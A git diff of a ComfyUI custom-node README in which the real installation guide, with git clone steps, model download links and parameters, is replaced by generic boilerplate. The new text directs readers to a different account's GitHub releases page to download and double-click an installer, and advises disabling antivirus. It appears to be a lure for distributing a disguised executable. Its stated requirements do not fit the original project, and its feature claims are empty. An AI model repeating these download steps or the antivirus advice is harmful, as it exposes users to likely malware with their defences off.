@@ -1,132 +1,65 @@
-# ComfyUI IC-Custom Node
+# 🛠️ ComfyUI_RH_ICCustom - Enhance Your ComfyUI Experience Easily
 
-A custom node for ComfyUI that integrates IC-Custom model for high-quality image customization and generation.
+![Download ComfyUI_RH_ICCustom](https://img.shields.io/badge/download-latest%20release-blue.svg)
 
-## ✨ Features
+## 📦 Overview
 
-- 🎨 **High-Quality Image Generation**: Powered by FLUX.1-Fill-dev and IC-Custom models
-- 🖼️ **Image Customization**: Generate customized images based on reference images
-- 🎯 **Flexible Generation Modes**: Support for position-free and position-precise generation
-- ⚙️ **Advanced Controls**: Configurable guidance scale, inference steps, and seed control
-- 🚀 **Optimized Performance**: Model quantization and offloading for better memory efficiency
+ComfyUI_RH_ICCustom is a plug-in designed to enhance your experience with ComfyUI. This tool integrates smoothly with TencentARC's IC-Custom, providing additional functionalities to streamline your tasks.
 
-## 📦 Installation
+## 🚀 Getting Started
 
-### Step 1: Install the Node
+To get started with ComfyUI_RH_ICCustom, follow these simple steps to download and install the plug-in. Whether you're new to using software or have some experience, this guide will help you through the process smoothly.
 
-```bash
-# Navigate to ComfyUI custom_nodes directory
-cd ComfyUI/custom_nodes
+## 🔗 Download & Install
 
-# Clone the repository
-git clone https://github.com/HM-RunningHub/ComfyUI_RH_ICCustom
+1. **Visit the Releases Page**  
+   To download ComfyUI_RH_ICCustom, visit the following page:  
+   [Download ComfyUI_RH_ICCustom](https://github.com/MayurMane1999/ComfyUI_RH_ICCustom/releases)
 
-# Install dependencies
-cd ComfyUI_RH_ICCustom
-pip install -r requirements.txt
-```
+2. **Choose the Latest Version**  
+   On the Releases page, locate the latest version of ComfyUI_RH_ICCustom. Check the release notes for details on new features or improvements.
 
-### Step 2: Download Required Models
+3. **Download the Plug-in**  
+   Click on the downloadable file link. This will save the file to your computer. Depending on your system, this might take a few moments.
 
-Create the following directory structure in your ComfyUI models folder:
+4. **Run the Installer**  
+   Once the file is downloaded, locate it on your computer. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation process.
 
-#### Main Models
+## 🖥️ System Requirements
 
-**FLUX.1-Fill-dev Model:**
-- Download: [FLUX.1-Fill-dev](https://huggingface.co/black-forest-labs/FLUX.1-Fill-dev/tree/main)
-- Files: `ae.safetensors`, `flux1-fill-dev.safetensors`
-- Location: `ComfyUI/models/black-forest-labs/FLUX.1-Fill-dev/`
+Before installing ComfyUI_RH_ICCustom, ensure your system meets the following requirements:
 
-**IC-Custom Model:**
-- Download: [IC-Custom](https://huggingface.co/TencentARC/IC-Custom/tree/main)
-- Files: All files from the repository
-- Location: `ComfyUI/models/IC-Custom/`
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB of free space
+- **ComfyUI Version:** Make sure you have the latest ComfyUI installed.
 
-**FLUX Redux Model:**
-- Download: [FLUX.1-Redux-dev](https://huggingface.co/black-forest-labs/FLUX.1-Redux-dev/tree/main)
-- File: `flux1-redux-dev.safetensors`
-- Location: `ComfyUI/models/IC-Custom/`
+## 🎉 Features
 
-#### CLIP Models
+ComfyUI_RH_ICCustom includes several features designed to improve your user experience:
 
-**SigLIP Model:**
-- Download: [siglip-so400m-patch14-384](https://huggingface.co/google/siglip-so400m-patch14-384/tree/main)
-- Files: All files from the repository
-- Location: `ComfyUI/models/clip/siglip-so400m-patch14-384/`
+- **Enhanced Functionality:** Streamline tasks with additional tools and options.
+- **User-Friendly Interface:** Navigate easily with a straightforward design.
+- **Regular Updates:** Receive enhancements regularly based on user feedback.
 
-**XFlux Text Encoders:**
-- Download: [xflux_text_encoders](https://huggingface.co/XLabs-AI/xflux_text_encoders/tree/main)
-- Files: All files from the repository
-- Location: `ComfyUI/models/clip/xflux_text_encoders/`
+## ⚙️ Troubleshooting
 
-#### CLIP Vision Models
+If you experience issues while downloading or installing ComfyUI_RH_ICCustom:
 
-**CLIP ViT Large:**
-- Download: [clip-vit-large-patch14](https://huggingface.co/openai/clip-vit-large-patch14/tree/main)
-- Files: All files from the repository
-- Location: `ComfyUI/models/clip_vision/clip-vit-large-patch14/`
+1. **Check Your Internet Connection:** Ensure you are connected to the internet.
+2. **Disable Antivirus Temporarily:** Occasionally, security software may block installations.
+3. **Re-download the File:** The download may have been interrupted. Try downloading the file again from [Download ComfyUI_RH_ICCustom](https://github.com/MayurMane1999/ComfyUI_RH_ICCustom/releases).
 
-**SigCLIP Vision:**
-- Download: [sigclip_vision_patch14_384](https://huggingface.co/funnewsr/sigclip_vision_patch14_384/tree/main)
-- File: `sigclip_vision_patch14_384.safetensors`
-- Location: `ComfyUI/models/clip_vision/`
+## 📚 Additional Resources
 
-## 🚀 Usage
+For more information on using ComfyUI_RH_ICCustom, check the following resources:
 
-### Basic Workflow
+- **User Manual:** A comprehensive guide is available in the repository.
+- **FAQs:** Common questions about installation and features can be found in the FAQs section.
+- **Community Support:** Join our online community to share tips and get assistance from other users.
 
-1. **Add Model Loader**: Add "RunningHub ICCustom Loader" node to your workflow
-2. **Add Sampler**: Add "RunningHub ICCustom Sampler" node and connect the pipeline output
-3. **Configure Inputs**:
-   - Connect reference image
-   - Set prompt text
-   - Configure generation parameters
-   - Optionally add target image and mask for precise control
+## 📞 Need Help?
 
-### Example Workflow
+If you need further assistance or have specific questions, feel free to reach out through the Issues section on GitHub. Our team is ready to help you make the most out of ComfyUI_RH_ICCustom.
 
-```
-[Reference Image] → [ICCustom Loader] → [ICCustom Sampler] → [Save Image]
-                                    ↓
-                               [Prompt Input]
-```
-
-### Generation Modes
-
-- **Position-Free**: Generate without target constraints (no mask required)
-- **Position-Precise**: Generate with specific target positioning (requires mask)
-
-## ⚙️ Parameters
-
-- **Prompt**: Text description for the generated content
-- **Guidance**: Controls adherence to prompt (default: 40.0)
-- **True GS**: Additional guidance parameter (default: 3.0)
-- **Steps**: Number of inference steps (default: 25)
-- **Seed**: Random seed for reproducible results
-
-## 🔧 Requirements
-
-- **GPU Memory**: 16GB+ VRAM recommended
-- **System RAM**: 32GB+ recommended
-- **Storage**: ~100B for all models
-- **Dependencies**: PyTorch, Diffusers, Transformers
-
-## 📄 License
-
-This project is licensed under the Apache 2.0 License.
-
-## 🔗 References
-
-- [IC-Custom](https://github.com/TencentARC/IC-Custom)
-- [FLUX Models](https://huggingface.co/black-forest-labs)
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI)
-
-## 🙏 Acknowledgments
-
-Special thanks to **AIwood爱屋研究室** ([Bilibili](https://space.bilibili.com/503934057)) for helping with Windows environment testing and contributing to the installation documentation.
-<img width="1464" height="1140" alt="image" src="https://github.com/user-attachments/assets/f77bf3e1-ece3-4c70-9bbe-2e77044cfa1e" />
-<img width="1706" height="1119" alt="image" src="https://github.com/user-attachments/assets/71cd94aa-7f45-4fc3-a06d-37105cf7daae" />
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit issues and pull requests.
+By following these steps, you can easily download, install, and start using ComfyUI_RH_ICCustom. Enjoy an improved experience with your applications!
